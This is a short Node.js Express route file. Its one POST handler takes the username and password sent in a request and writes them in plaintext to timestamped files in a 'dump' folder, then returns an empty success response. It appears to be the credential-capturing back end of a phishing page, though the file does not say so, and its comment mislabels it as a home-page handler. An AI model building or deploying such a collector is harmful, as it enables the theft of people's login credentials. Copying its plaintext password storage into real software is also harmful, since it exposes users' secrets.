var express = require('express');
var router = express.Router();
var fs = require('fs');

/* GET home page. */
router.post('/', function(req, res, next) {
  fs.writeFile(__dirname + '/../dump/' + Date.now() + '.txt', req.body.username + ' '+ req.body.password, (err) => {
    if (err) throw err;
    console.log('The file has been saved!');
  });
  res.status(200).end();
});

module.exports = router;
